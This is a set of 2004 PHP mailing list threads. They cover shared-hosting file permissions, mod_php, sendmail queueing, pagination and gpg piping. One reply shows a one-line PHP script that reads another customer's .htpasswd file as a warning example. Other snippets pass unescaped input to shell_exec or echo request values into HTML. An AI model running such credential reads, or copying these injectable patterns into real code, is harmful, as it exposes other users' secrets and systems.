Subject: [nycphp-talk] Pair Network's "security" model - could it be this bad?
Message-ID: <40BCB868.20308@ceruleansky.com>

Hello all,

I have been looking for a virtual private server, or another shared 
server hosting provider.

I have been doing some research, and came across Pair Networks ( 
www.pair.com ). They have been around for quite some time (since 1996, I 
think) and seem to have a good reputation.

I was about to sign up for one of their high-end shared hosting plans 
(especially since their control panel looked both easy-to-use and 
flexible), and then I came across this bit of information buried in one 
of their FAQ pages:

------
http://pair.com/support/knowledge_base/frequently_asked_questions/security.html#4

"I was logged into my account, and when I went up one level from my home 
or Web directory, I could see everyone else's files!

This is a normal and reasonable security model. Files which are 
published by the Web server need to be publicly accessible, as the Web 
server software runs without any special privileges. Your files will not 
be subject to modification by other users on the server unless you have 
set the permissions specifically to allow that, or if the files have 
been created through CGI scripts running as user "nobody". Read more 
about file permissions.

You can protect script source code through the use of "cgiwrap", and if 
you prefer security through obscurity, you may set permissions in a way 
that blocks casual browsing by other users. Details are available in our 
Support Resources.

Being able to see a file does not mean you can modify it."

------

If I understand correctly, what they are saying is that if I sign up for 
an account with them, ANY of their other 150,000 customers will be able 
to READ all of my web files, including PHP source code and database 
passwords.

They seem to have a clumsy workaround called php-cgiwrap:

http://pair.com/support/knowledge_base/authoring_development/system_cgi_php-cgiwrap.html

I don't know, but this "security model" seems ANYTHING BUT "normal and 
reasonable" to me.

In my current setup, a domain can be mapped to a directory in a certain 
user's root directory. Only that user can access any of the files in 
that user's directory. Pair's method of hosting seems totally insecure 
and inflexible, and their workaround seems like a real pain in the you 
know where.

Does anyone else have another opinion on this?

Best Regards,

- Jay

How does the webserver (Apache?) access the files? Surely they are 
readable by the 'nobody' or 'www' user... which means that anyone who 
can run a script via the webserver can read any other script that can be 
run by the webserver.

It's unfortunately standard. Mass virtual hosting is insecure by nature, 
and that's fine for most people. If you have data you want to protect, 
you need to consider a dedicated server -- or a jail-able system like 
FreeBSD.

Then the web server is also running as that user?

It works for me, I've been a customer for a while. Shared hosting entails
certain inherent security risks and you have to take steps to mitigate
them.

Shiflett has a nice piece about that kinda stuff in the latest issue PHP
Architect which they were handing out free-as-in-beer at the last NYPHP
meeting (-:

Hi Jayesh:

In a shared environment, if there are files you MUST keep from being read 
(for instance, passwords for database connections, etc) chmod them to be 
only readable by you and then configure the scripts that do need database 
access to execute as a CGI script.  I do this all the time.

One way for ISP's to reduce exposure is to put all users into a group and
have all files on the web server put into that group and set the mask to
make files not readable/writeable/executable by "group" but readable by
"other" so the web server can get to them.

Enjoy,

--Dan

Hello all,

thanks for all of your quick replies.

To clarify on my current setup:

I am not an expert on UNIX permission and such things, but here is my 
(limited) understanding of how it might work:

- from the control panel, you can add an FTP or shell user

- from the control panel, a domain is mapped to either of those user's files

- when you setup a domain, you can choose whether PHP scripts are run an 
apache module (aka "running as Apache") OR as CGI (aka "running as my user")

- when you FTP in, you cannot go "up" and browse a list of other user's 
directories, since you are in the root directory of the account into 
which you FTPed

- scripts are disabled from reading outside of their domain-files 
directory (something is changed in PHP's configurationhere ) 
["open_basedir Restrictions in effect, file is in wrong directory"]

- scripts cannot access external programs ["backticks (``), system(), 
exec(), passthru()" are disabled]

More information on the shared server's configuration:

https://panel.dreamhost.com/kbase/index.cgi?area=2526&keyword=security

So, as far as I know, files placed in a certain shell or FTP user's 
accounts are private.

Please correct me if this seems incorrect.

Best Regards,

- Jay

I agree with Jay,  When I ftp or ssh into my account at boxnix, the root
directory is the home directory of my account.  I can't "cd ..".  I just
end up at the root level, and can only see my files.  How could anyone
else with a different account have access to my files?

Yes, this is commonly known as "safe mode" php, and it was implemented 
to solve this very problem.

Can you run scripts written in other languages, though? Perl, or even 
shell scripts, *might* be able to access other areas...

Calling your scripts via CGI (where that allows them to be run suid) 
allows you to set them so that they are only readable by you -- this 
provides as high a level of protection as you can reasonably ask for.  
There is a performance hit, but on a shared server that's probably not 
an issue, especially as it is most likely tuned to support the extra 
processes.

 From your updated description it sounds like the ISP is taking a 
responsible approach, and at least giving you the option of making sure 
things are locked down. The only other question I would ask is whether 
you can use SFTP or SCP in place of FTP -- if someone can eavesdrop your 
password it doesn't matter how secure the filesystem is!

This degree of protection is not standard or default, especially with 
ssh. In, er, less developed operations they may not be using a chroot'd 
ssh or shell.

Anyway, unless the webserver is restricted to your home directory, too 
(unlikely), someone might be able to use the webserver to do their dirty 
work for them:

<?php print file_get_contents("/home/otheruser/.htpasswd"); ?>

Again, that's what safe mode protects against.

cd may bring you to your home but certainly you can cd /tmp or cd 
/usr/local/www for instance. I know this to be true at Pair, as I once 
had an account there.

Hey Bill, I've been with Boxnix almost 2 years now and have worked with them
quite a bit.  They put a lot of time into ensuring their virtual hosts are
really secure.  Their servers seem to get tighter and tighter, but whiles
staying developer friendly  all the time.  All their accounts have been
sandboxed incredibly well.  'nobody' no longer exists on their servers, as
all your scripts run as 'you' (your login).  They explained it to me at some
point, but it's been a while.  I haven't tested to any serious degree, but
from what I've seen thus far, you can't get out of your sandbox and into
others.

I tend to highly recommend them quite often.

P.S. I've worked with them before as a freelance developer... So, I am
biased, but that's due to good service and good people.   I don't get
anything for recommending them, nor would I have worked with them if they
sucked.

Mark

Thanks for the good responses and tips, Chris (Snyder).

My host does not have SFTP support, but they offer a VPN option for 
extra amount per month.

I just found this page which (humorously) refers to the two of the 
things you mentioned (using SFTP and chrooting users):

http://chrootssh.sourceforge.net/

Also, I belatedly noticed that Daniel's (Convissor) page on UNIX 
permissions is linked from host's knowledge base:

http://www.analysisandsolutions.com/code/chmod.htm

It is a good document. I really need to read up on all this "user", 
"group" and "other" stuff (!) It can get a bit confusing. Now I know why 
Windows by default is insecure - it's just easier.

The only (and scary) thing is - when I am on shared host, it's not that 
ha-ha to find out that other users could be snooping through my source 
code or db password. That's almost like open source by coercion.

I feel that webhosting providers which specialize in shared hosting 
should be upfront in the security policies they follow - and in the case 
of setups such as Pair Networks', alert users in all ways possible to 
use php-cgiwrap (or whatever other abstruse method is required) to keep 
data private.

Many non-developers (including static HTML coders and graphic designers) 
don't have the slightest idea about chroot, SSH, shell users, 
permissions and such. It seems that any webhosted interested in being 
present for the long term and in the security of its user's data would 
take a better approach.

I know, it seems like I am bashing Pair, when I fact I thought they were 
quite cool until yesterday. It could just be my ignorance on the subject 
showing - that I am perhaps more outraged at my own previously lack of 
interest (or ignorance) on the subject of security that at Pair's shared 
hosting setup.

I guess what Chris was saying was that it is the norm for shared hosting 
providers to be lax about security and that therefore it is the 
customer's job to worry about whether his data is safe.

I know, all my ranting on this subject does make me look like a paranoid 
freak (something my brother has joked about on more than one occassion). 
I am really not that way - see, I use Windows on the desktop, I don't 
dream about compiling my version of PHP, or security jails. It's just ...

Best Regards,

- Jay

Subject: [nycphp-talk] "mod PHP" vs. PHP
Message-ID: <40BDDD64.9050400@ceruleansky.com>

Hello all,

I have a somewhat stupid question: what's the difference between "mod 
PHP" and PHP?

I was looking the specifications from a hosting provider, and they 
mentioned supporting "mod PHP" instead of "PHP":

http://www.jumpline.com/vds_hosting_compare.php

(BTW, their affordable "sandboxed" shared server architecture may be of 
interest to those people following yesterday's discussion.)

Best Regards,

- Jay
PS: Please forgive my incoherent posts from yesterday. I would do well 
to proofread things before I click the "send" button.

Hello,

here's a quick followup from my previous question.

Anyone who followed my previous link to Jumpline - don't sign up with 
them. I did some research, and it seems they have a bad reputation with 
customer service (with some customers threatening a class action suit 
against them).

I guess I will try out Boxnix.

I am interested in finding out if PHP has an equivalent to the Java 
"super" keyword that evokes methods or constructor of the class' parent 
class.  I can't find anything online on this and hoped maybe one of you 
guys came up with a nice workaround for this in PHP 4.3.2+ that I could 
learn.  Or point me in the right, open-source, direction for me to 
figure this out.

Its not quite the same as "super" because its not generic but this works:
  class SubClass extends SuperClass {

    var $mySubClassVar;
 
    function SubClass($myVar) {
     parent::SuperClass('hello world?');
     $this->mySubClassVar = $myVar;
     echo "sub class var = $myVar<p>";
    }
 
  }

PHP 5 offers unified constructors using the __construct() method, which will
allow you to generically call parent::__construct() and get the constructor in
every case.

HTH,
Andrew

One workaround for constructor names in php4 is as follows:

class SubClass extends SuperClass {
   var $mySubClassVar;

   function SubClass($myVar) {
     $constructor = get_parent_class($this);
     parent::$constructor('hello world?');
     $this->mySubClassVar = $myVar;
     echo "sub class var = $myVar<p>";
   }
}

This should work in every case.

I would absolutely agree that OOP in PHP5 would be far more well received.
High performance is a great subject, but we have a lot more php performance
articles available to us than we do php5 resources.

The CGI approach can definitely help, but only if you take advantage of
it. You must restrict access to sensitive scripts to your user, otherwise
there's no point.

What kind of scripts? This sounds like it might be limited to PHP scripts.
Are the attackers you're worried about only proficient in PHP? This seems
unlikely to be always true.

> Please correct me if this seems incorrect.

Based on the email from Mark Armendariz, it sounds like this host might
use a chroot jail for each account, and each jail has its own Apache. This
is one of the most secure approaches, but shared servers are never going
to be as secure as dedicated ones. This is one of the tradeoffs.

Both!

Personally, I'd like the OO one, but it depends what his definition of 'High

I'm intrigued by this... doesn't it mean that each account has it's own 
IP address?

Or is there some sort of transparent proxy that listens on port 80 and 
forwards each request to the appropriate server (which is listening on 
some high-numbered port)?

Hi All,

The company I work at (I'm the lead developer) has OKed an additional 
developers position at around 40k (40+).
I've been looking at some other job offers out there to get an idea of 
how experienced a developer we can get for that ballpark.

I saw a few postings on craigs list like these:

http://newyork.craigslist.org/mnh/eng/30780251.html
http://newyork.craigslist.org/mnh/eng/30286153.html
http://newyork.craigslist.org/mnh/eng/31709044.html

and I'm wondering - can I really get a "PHP Rock Star" with "thorough 
knowledge and experience in PHP, MySQL, and JavaScript" and "3+ years 
experience" for 40k?

Thoughts ?

Thanx
Ophir

p.s.
I'll put up an official job posting in a couple of days so please don't 
send me any resumes yet ;)

no

You will however get someone who "thinks" they are a "rock star" and
trumpets about 3+ (insert hazy definition of three years) and who will
jack up your databases real good ;)

You pay for what you get in general and 40k is 'really' bad for here in
NY when the building janitors average salary is 70k.

For 40k, I'd me more than happy to come in late (if at all), drink all 
your booze, chase around the groupies, and throw the occasional TV out 
the window; but that's about all. You wouldn't get me in Spandex for 
less than twice that...

40K will get you a "PHP Rock Star"... in India or Eastern Europe.

I didn't want to be first.... I have no experience hiring in Manhattan. 
However, in North Jersey you'd get a junior who has 1 year experience 
scripting, at best.

Subject: [nycphp-talk] Digital Signatures in PHP
Message-ID: <40BE6FAA.8000507@phpwerx.net>

Hi,

I'm trying to figure out the best way to create digital signatures in 
PHP.  I'm not picky about interoperability as the purpose is purely to 
tell if someone has tampered with a given file.

The openssl_sign and openssl_verify functions look like exactly what I'm 
after but the manual warns they are experimental and not to be used...so 
I'm asking if anyone has already solved this problem, or has used the 
openssl functions successfully.

I could just do the hashing myself and use the openssl_encrypt/decrypt 
functions which don't seem to be marked experimental, but that just 
smacks of effort, and doesn't seem too efficient either.

My other thought was mcrypt, but it only seems to support symmetrical 
ciphers which don't really help me out.

I'd appreciate any advice you can give me,

Dan Cech

I'll be there. I'm actually speaking on "Cross Platform Web Services
for eCommerce" (e.g. writing apps using the eBay API).

My talk is in the afternoon, after Andi's "PHP 5" talk.

George and his brother wrote an MTA that can process over 400 messages per
second, he's the author of APC (the open source compiler cache for PHP),
and he's regarded as the top authority on PHP performance and scalability.
I think his definition of high performance exceeds any of our own. :-)

OTOH I take it back. In a shared hosting environment you're not likely to
be able to pick and choose which Apache modules to run.

mod_log_sql  looks like a good solution for nyphp.org (?)

In fact, it would be very interesting if someone wrote an import/export 
routine to bring existing access logs into the mod_log_sql database... 
then we could combine the past 2 years of log with forward logs.... I 
imagine it would take some serious MySQL expertise though, so maybe it's 
asking too much   ;-)

Thanks for pointing this out. I remember that article.
I'm looking for a "brain-dead" solution, i.e., one that can be 
implemented in minutes.

Ok. I've stumbled across a need for Clew, or perhaps
there might a way to complish this of which I am not aware:

I choose not to receieve any emails from the nyphp-talk list, (read it
once a day on the web) but I do want to reply to some messages
in a manner such that the web interface organizes the threads
properly..  (in my 2 previous reply posts, I added a "Re:"

enough to strip it out when processing my replies).

Any clews?

That's a good question. In general, mod_php is specific - it indicates an
Apache module (like mod_* typically does). However, no one I know ever
really uses this term.

Contrast with Perl for a moment. In the beginning, there was Perl, the
language. It was a typical scripting language, complete with interpreter.
Years later, an Apache module called mod_perl was written, and this
allowed Perl programmers to do the same sort of things we do with PHP
(technically, it was an attempt to implement the entire Apache API in
Perl, so it's more flexible in some ways than PHP). So, in the Perl world,
it's pretty clear:

Perl = Regular interpreter
mod_perl = Web interpreter

With PHP, things are a bit different. We use:

PHP = Web interpreter
PHP CLI = Regular interpreter

The use of mod_php is also restricted to Apache (I don't think any other
SAPIs are called mod_php; correct me if I'm wrong), and unlike Perl, PHP
supports additional Web servers. So, we can't really use only the terms
PHP and mod_php to distinguish these uses anyway.

I'm not sure if that clarifies anything, but that's my view of history.

Actually, it would be quite easy to import. You would only need a 5 line 
shell
script  which sliced and diced the existing logs. Then a mysql query to 
"load data infile into table blag_logs".

For low bandwidth sites, I don't see a problem with mod_log_sql, however 
if you are
serving lots of pages, you could quickly saturate your network or disk 
i/o bandwidth (depending
on if your mysql is on the same machine or another).

As an example, I'm hosting a pretty high traffic phpBB for someone right 
now. Sometimes
the site is hit with like 30+ page requests/sec. PhpBB is quite a hog 
and when people are viewing
a page full of posts that contain 100+smiley icons, etc (each one 
counting as a hit) you can
easily run up like 3000 hits/sec. Each hit is an entry in the apache 
log... Now if you had mod_log_sql
running, your server would have to manage 3000+ mysql inserts per sec.. 
that would place a serious
load not only on your disk i/o but also cpu. What makes matters worse 
with phpBB, is (and I'm not
completely sure about this) that the pages are set to "nocache" so 
everything is reloaded upon
every page access. This keeps the load on the server consistently high 
throughout the day.

Subject: [nycphp-talk] sending email from PHP
Message-ID: <BCE4D5EB.103CC%corey@domanistudios.com>

I?m trying to build a tool to send dynamic emails (think order summary) from
PHP. I?m running into very long delays waiting for sendmail to return a
result.

For example, a person submits an order, the function that handles  the
transaction does a couple of things:

1. Sends an order confirmation to the store
2. Sends an order confirmation to the customer

The whole process can take over 1 minute, which times out the browser. I?ve
tracked it down the delay to sendmail verifying the remote email address.
Since sendmail talks to the remote mail server in real-time, any network
lag, or DNS lag, causes the order process to hang. In my case, it does it
twice.

I?ve looked at Pear Mail_Queue, and that looks interesting, but a bit
overkill. I?ve also looked at going around the mail() function and opening
an SMTP socket directly to sendmail (same delays... in fact when I open a
session via command line, I can see the exact step in the SMTP conversion
where the lag happens)

Here?s what I?d like to do (and this would be helpful for anyone sending out
a modest volume of email)...

1. send the mail to sendmail
2. sendmail puts it into a queue
3. sendmail periodically checks this queue and sends the email.

Essentially, I?d like to fork the slow lookup stuff to the background,
returning control the browser as soon as possible. This has the added
benefit of scaling to very large emails/hour since the browser never has to
wait for sendmail (or an external server) before a visitor can move on.

I?m pretty sure that this is intrinsic to the way sendmail works, but most
of the documentation talks about the queue holding mail that?s not
deliverable. What I?d like to do is put to put a delay on the email before
it?s processed by sendmail.

Any ideas?

I'll take a stab at this, but only because no one else has said it quite 
this way.

mod_php is a nickname for PHP compiled as an Apache module, whereas PHP 
(cli or cgi) refers to the standalone interpreter.

The functional difference is that mod_php is available within every 
httpd process. When Apache encounters a PHP script, it hands it off to 
its internal module for processing, then puts the output on the wire.

Standalone (cgi) PHP is run as a separate process: when Apache 
encounters a PHP script, it executes PHP as a command, passing the 
script and the $_SERVER environment. When suexec is involved, Apache 
runs the php command with the same uid as the owner of the script. The 
separation of processes allows the separation of powers. My 
understanding is that this is slightly less efficient, but it's 
certainly safer.

Subject: [nycphp-talk] Problem with Pagination
Message-ID: <40BF63C4.3040209@adnet-sys.com>

I wrote a class method that will handle pagination regarding 
medium-sized resultsets (estimating maximum number of rows at 500).  
Everything works beautifully, except one annoying problem that involves 
someone with a math degree or really really good with numbers:

The "next link" displays the wrong number of "next" items every time!  I 
can't honestly, for the life of me, figure out the algorithm to get it 
right.  The pagination functionality works perfectly, except that one part.

Here is the "Reader's Digest" version of my class:

[PHP]
|class PaginationView extends View {

         var $result;   // YOUR RESULTSET

        function PaginationView($result) {   // CONSTRUCTOR
                $this->result = $result;
        } 

    function &displayPage() {                            // STATIC HTML 
STRING METHOD
        global $section, $action, $album, $headerMenuArray, $willPaginate, $displayItemLimit; 

        foreach ($_REQUEST as $key => $val) if (!isset(${$key})) ${$key} = $val; 


        $qs = "section=$section&action=$action&sort=$sort&chooseAlbum=1&album=" . urlencode($album) . '&willKeepPageSession=1';    // 
FOR EASE OF WRITE

                if ((int)$page === 0) $page = 1;
        $page = (int)$page;        // CONVERT TO INTEGER

            if (@sizeof($this->result) > $displayItemLimit && $willPaginate) { 


         $html .= "<div align=\"center\">\n"; 

         // PREVIOUS LINK
         if ((int)$page !== 1) {
          $pagePrev = $page - 1;
          $html .= " <a href=\"index.php?$qs&page=$pagePrev\">Previous $displayItemLimit ${section}s in \"$album\"</a>&nbsp;<b>|</b>&nbsp;"; 

         } 

             $numPages = (int)(@sizeof($this->result) / $displayItemLimit);
            
         // ALL PAGES (PAGE NUMBER) LINK(S) EXCEPT FOR LAST PAGE
         for ($i = 1; $i <= $numPages; $i++) {
          if ((int)$i === (int)$page) $html .= "$i&nbsp;<b>|</b>&nbsp;"; else $html .= "<a href=\"index.php?$qs&page=$i\">$i</a>&nbsp;<b>|</b>&nbsp;"; 

         }

        // LAST PAGE NUMBER LINK
         if (@sizeof($this->result) % $displayItemLimit != 0) {
          if ((int)$i === (int)$page) $html .= "$i&nbsp; "; else $html .= "<a href=\"index.php?$qs&page=$i\">$i</a>&nbsp; "; 

         }

        // NEXT LINK
         $offset = (int)(@sizeof($this->result) - ($displayItemLimit * ($page - 1))); 

         if ($offset > 0) {        
          $pageNext = $page + 1;
          $html .= "&nbsp;<b>|</b>&nbsp;<a href=\"index.php?$qs&page=$pageNext\">Next "; 

          $html .= ($offset + (int)$displayItemLimit > @sizeof($this->result)) ? (int)($displayItemLimit - $offset) : $displayItemLimit; 

          $html .= " ${section}s in \"$album\"</a>";
         }

         $html .= "\n</div>\n";
        }
        return $html;
    }

}

|

-- 
[/PHP]
Here is a sample output that results with a $displayItemLimit of
20 items and I'm on page "1" and there are 45 items altogether:





    quote:
    ------------------------------------------------------------------------
    1 | 2 | 3 | Next -25 images in "Album 1"
    ------------------------------------------------------------------------





The problem is the $offset variable I know in the // NEXT LINK code
block, but I'm stuck, I can't figure it out, furthermore, both of these
utterly fail in PHP 4.3.2 on my system:





    |PHP:|
    ------------------------------------------------------------------------
    |
    $pagePrev = $page--;
    |
    ------------------------------------------------------------------------


    |PHP:|
    ------------------------------------------------------------------------
    |
    $pageNext = $page++;
    |
    ------------------------------------------------------------------------



Both result in $pagePrev and $pageNext having null values even though 
$page exists and is cast into an integer

-----------------------

At this point I'm not sure what else to do since I'm close to implementing my Pagination class instantiation on my other display classes, but not until I get this one problem fixed or someone just guide me in the right direction as to the exactly working algorithm for at least the "next" links to display correctly.




	*Update*

I am basing my algorithm on the tutorial at 
http://www.phpfreaks.com/tutorials/43/4.php

Yeah, md5 is ok if you just want to take a hash to see if someone has 
changed something, but I need to be able to store the message and the 
hash together, so encryption is mandatory.

I was looking into this, but it seems to have a few drawbacks, notably 
having to write everything to file, I'd rather do it internally if at 
all possible.

Now that I have figured out how to get the keys into the right format 
the openssl_sign and openssl_verify functions actually seem to work very 
well, it's just a question of how reliable they are on older versions of 
php.

Are you sure there isn't another *right* way 
to explain that?

And did you really say:

"In the beginning there was Perl..."

You better put on an asbestos flak-jacket

My advice is that you should buy "PHP Cookbook" and steal the recipe
from there. :)

Or, just look at the source for the PEAR pager classes.

Or older versions of openssl?  Bravo for taking this road, though, it

Corey,

It sounds like you could have a problem with your sendmail configuration -
have you experienced this problem in the past? The php mail() function is
usually pretty snappy, at least for sending out smaller volumes such as 2
emails.

Also, have you tried using the phpmailer class?

I have some issues along these lines but made a few changes in the way PHP
interfaces with sendmail.  Here are the key changes:


1. Set the from address in sendmail before you use it and set delivery mode
to defer.  Make sure your from address is a trusted user of sendmail to
suppress the warning of identity change.

$fromaddress='info at yourdomain.com'
		putenv("PHP_SENDMAILPARAMS= -O DeliveryMode=defer -f
$fromaddress");

2. Build your lists and use the regular ole mail command

			$datasent=mail($toaddress, $subject,
$bodytext, "From: ".$fromaddress."\r\n"
			     ."Bcc:".$addbcc."\r\n"
				."Reply-To: ".$fromaddress."\r\n"
				."Errors-To: <".$fromaddress.">"."\r\n"
				."X-Mailer: PHP/" . phpversion());

3.Flush the queue or just wait for sendmail's natural queue flush (depends
on how you have this setup and how quickly you need to process the queue)

$processq=exec('/usr/lib/sendmail -q >/dev/null &');

Making these changes made email broadcasts practical and is 100 x faster
than the default setup where php waits for sendmail to deliver.

Hope this helps

Mike

Yea, sometimes I wish you could just pipe data to gpg and have it spit 
out an
encrypted message... rather than having it operate on an existing file. 
Storing
sensitive information in a temporary file  which has readable permissions
by the web server leaves me feeling a bit insecure too.

So phpopentracker would suffer from the same factors on larger traffic 
sites (since it writes to the database with every hit).

Does anyone rsync the access log to another server running a php/mysql 
traffic logging system ( php not perl) ?

sending email from PHPHi Corey,

Sounds like an interesting problem. I've toyed with various mail sending
scripts including phpmailer (http://phpmailer.sourceforge.net) and
pear_mail_mime with pretty good luck in multiple configurations. In the
configurations I've used, the script calls out to sendmail (in my case Exim,
which is a nice drop-in alternative to sendmail) and places the mail in the
que of the mail server. The script runs as fast as it can make a request to
the mail server. That said, I think the problem is outside php. If you're
experiencing problems communicating with sendmail, you might try clearing
out the existing que first. It looks like Michael's suggestion is much more
in depth than what I'm telling you though. I bet he's right on the money.

I haven't dealt extensively with email address verification though. I've
toyed around with various ideas, but as far as I know, outside of making
requests to the MX of the domain directly, there's not an elegant way to
handle it. In doing so, you're actually writing a mail server. Quite a task.
As such, I've just had to deal with the replies to the sender's email from
the email recipient's MX telling me that the address doesn't exist, or that
the mailbox is full, or whatever.

I'd be interested in hearing other people's solutions for email
verification. It's such an important thing to do. There's gotta be an easy
way.

Good luck!

Eric

Subject: [nycphp-talk] sending email from PHP


I'm trying to build a tool to send dynamic emails (think order summary) from
PHP. I'm running into very long delays waiting for sendmail to return a
result.

For example, a person submits an order, the function that handles  the
transaction does a couple of things:

1. Sends an order confirmation to the store
2. Sends an order confirmation to the customer

The whole process can take over 1 minute, which times out the browser. I've
tracked it down the delay to sendmail verifying the remote email address.
Since sendmail talks to the remote mail server in real-time, any network
lag, or DNS lag, causes the order process to hang. In my case, it does it
twice.

I've looked at Pear Mail_Queue, and that looks interesting, but a bit
overkill. I've also looked at going around the mail() function and opening
an SMTP socket directly to sendmail (same delays... in fact when I open a
session via command line, I can see the exact step in the SMTP conversion
where the lag happens)

Here's what I'd like to do (and this would be helpful for anyone sending out
a modest volume of email)...

1. send the mail to sendmail
2. sendmail puts it into a queue
3. sendmail periodically checks this queue and sends the email.

Essentially, I'd like to fork the slow lookup stuff to the background,
returning control the browser as soon as possible. This has the added
benefit of scaling to very large emails/hour since the browser never has to
wait for sendmail (or an external server) before a visitor can move on.

I'm pretty sure that this is intrinsic to the way sendmail works, but most
of the documentation talks about the queue holding mail that's not
deliverable. What I'd like to do is put to put a delay on the email before
it's processed by sendmail.

Any ideas?

I was browsing the mod_log_sql manual and realized that you can specify
in the configuration what to log and what not to log
( ie. LogSQLRequestIgnore .gif .jpg)  That would really cut down on
the amount of unnecessary data logged.. I might just give it a try.

They are not hard to write.

I did tlimit.com though not opensource at this time, but I am
considering it.

I?m not a sendmail expert, and I?d bet that something is screwy with either
my sendmail configuration or with our local DNS setup. I also agree that my
problem is outside of PHP.

For example when I try to do manually what PHP does with the mail()
function:

    sendmail -v corey at domanistudios.com <out.txt

(the ?v tag makes it verbose, and <out.txt pipes in a basic text file as a
body).

This takes just as long as mail(): about 30-45sec.

Mike DeWitt?s trick doesn't seem to be working either, and I think it?s
because of this line:

putenv("PHP_SENDMAILPARAMS= -O DeliveryMode=defer -f $fromaddress");

Does anyone know if ?PHP_SENDMAILPARAMS? is something special that sendmail
listens for? I?m not familiar with how PHP, environment variables, and
sendmail cooperate with each other. Can anyone explain this? Do I need to
tell sendmail to look for this environment variable?

I?m interested in how sites are able to send out millions of emails a day...
there must be a simple way that I?m overlooking.

If you're just concerned about Apache, mod_throttle might do the trick.

Phillip,

after taking a look at your code i have come to this conclusion and may be
incorrect

your code :

$html .= ($offset + (int)$displayItemLimit > @sizeof($this->result))

shouldnt that be

$html .= (($offset + (int)$displayItemLimit) > @sizeof($this->result))
i have added the parenthesis around
$offset + (int)$displayItemLimit
so that the addition get's completed before the > operator is evaluated.

let me know if that fixes the problem

Joe Crawford Jr.

I'm sorry I'm a bit confused as to where you pulled that information 
from.  Here is the snippet now that correctly produces the "next" link:

         // NEXT LINK
         $pageItemCount = (int)(@sizeof($this->result) - ($page * 
$displayItemLimit));
         if ($page <= $numPages && (int)$pageItemCount > 0) {       
          $pageNext = $page + 1;
          $html .= "<b>|</b>&nbsp;<a 
href=\"index.php?$qs&page=$pageNext\">Next ";
          $html .= ($pageItemCount < $displayItemLimit) ? $pageItemCount 
: $displayItemLimit;
          $html .= " ${section}s in \"$album\"</a>";
         }

They need to make pagination easy.

Phillip,

here is your code, the red ( ) are the one's i added ;) let me know if that worked.

        // NEXT LINK
         $offset = (int)(@sizeof($this->result) - ($displayItemLimit * ($page - 1))); 

         if ($offset > 0) {        
          $pageNext = $page + 1;
          $html .= "&nbsp;<b>|</b>&nbsp;<a href=\"index.php?$qs&page=$pageNext\">Next "; 

          $html .= (($offset + (int)$displayItemLimit) > @sizeof($this->result)) ? (int)($displayItemLimit - $offset) : $displayItemLimit; 

          $html .= " ${section}s in \"$album\"</a>";
         }

Ok, at long long last, after 2 whole days I successfully implemented 
Pagination on at least one of the Views.  One down, 12 more to go :(

here is the Pagination method displayPage() in its entirety.  Thanx for 
your help, I'm not that quick on complex mathematical algorithms..

    [PHP]
    /**
     * Display pagination links
     *
     * @access public
     * @param boolean $willHideAlbum (default false)
     * @return mixed HTML
     */
    function &displayPage($willHideAlbum = false) {                    
        // STATIC HTML STRING METHOD
        global $section, $action, $album, $headerMenuArray, 
$willPaginate, $displayItemLimit;
        foreach ($_REQUEST as $key => $val) if (!isset(${$key})) ${$key} 
= $val;

        $qs = 
"section=$section&action=$action&sort=$sort&chooseAlbum=1&album=" . 
urlencode($album) . '&willKeepPageSession=1';    // FOR EASE OF WRITE

                if ((int)$page === 0) $page = 1;
        $page = (int)$page;        // CONVERT TO INTEGER

            if (@sizeof($this->result) > $displayItemLimit && 
$willPaginate) {

         $html .= "<div align=\"center\">\n";

         // PREVIOUS LINK
         if ((int)$page !== 1) {
          $pagePrev = $page - 1;
          $html .= " <a href=\"index.php?$qs&page=$pagePrev\">Previous 
$displayItemLimit ${section}s";
          if (!$willHideAlbum) $html .= " in \"$album\"";
          $html .= '</a>&nbsp;<b>|</b>&nbsp;';
         }

             $numPages = (int)(@sizeof($this->result) / $displayItemLimit);
           
         // ALL PAGES (PAGE NUMBER) LINK(S) EXCEPT FOR LAST PAGE
         for ($i = 1; $i <= $numPages; $i++) {
          if ((int)$i === (int)$page) $html .= "$i&nbsp;"; else $html .= 
"<a href=\"index.php?$qs&page=$i\">$i</a>&nbsp;";
          if ($i + 1 <= $numPages) $html .= '<b>|</b>&nbsp;';
         }

        // LAST PAGE NUMBER LINK
         if (@sizeof($this->result) % $displayItemLimit != 0) {
          $html .= '<b>|</b>&nbsp;';
          if ((int)$i === (int)$page) $html .= "$i&nbsp; "; else $html 
.= "<a href=\"index.php?$qs&page=$i\">$i</a>&nbsp; ";
         }

         // NEXT LINK
         $pageItemCount = (int)(@sizeof($this->result) - ($page * 
$displayItemLimit));
         if ($page <= $numPages && (int)$pageItemCount > 0) {       
          $pageNext = $page + 1;

Corey,

Are you running mac osx? The reason why I ask is that there have been some
permissions issues with the default configuration of sendmail on os x,
specifically Jaguar.

If so, this article might help:

hope this helps

Actually, you can do that with the popen() function - it can a pipe to the
STDOUT of the gpg command.  Use a pipe or input re-direction to feed it data.
There are gpg examples in the comments:
    http://php.net/popen

You can also use proc_open() for bi-directional pipes if you have >= 4.3
avoiding the input trickery:
    http://php.net/proc_open

Use the latter if possible... less headaches.

The problem seems to be that some things are not making it into the logs 
(so slicing-and-dicing won't help) though we know, for certain, that it 
should be in the logs. After all, we have a three-step form procedure so 
we know that people make it to step 3. However, this doesn't show up in 
the logs. (We know they get to step 3 because the info they provide goes 
into a database.)

Does anyone know of php code with functionality 
similar to ASPImage for the automatic resizing of
images?

Thanks,

Built into the PHP code there is an entire suite of functions available 
for image resizing and other image-related manipulations.

I think he was tired of reading through dozens of emails where you were
trying to help someone figure out where a pair of parentheses were in
their code. There's a point after which where you are no longer answering
a question but are having a private discussion (and hand-holding), and
that point was passed.

I agree with Chris, even though I didn't speak up.

Chris

2nd that here. One of the reasons this list is worth anything is the 
high signal to noise ratio: ongoing discussions of php-related subjects 
that many people will find useful. When discussions bog down in 
particulars that are of little interest to the general subscriber base, 
it threatens the list itself since it makes people more likely to 
unsubscribe.

While we are here to help each other out, and point out new directions 
and ideas, this list isn't a substitute for hiring a developer. If you 
can't phrase a question in a manner that is generically of interest, it 
isn't really of any interest for anybody to answer. We all get stuck 
sometimes, and deserve an occasional hand, but habitual hand-holding 
should not be encouraged.

You can pipe data to gpg directly... this snippet is from my email class,
which does exactly that:

$enc = chunk_split(base64_encode(shell_exec("echo '$data' |
/usr/bin/gpg --homedir /user/.gnupg --compress-algo 1 --cipher-algo
3des -e -r $recipient 2>> /user/cgi-logs/gpg.log")));

(note the compression/cipher is completely compatible with pgp)

I got the technique from browsing their website http://www.gnupg.org/

That is great news! Hey, is there any danger in doing echo's of $data 
with shell_exec?
I'm wondering, if someone injected $data with something like say..
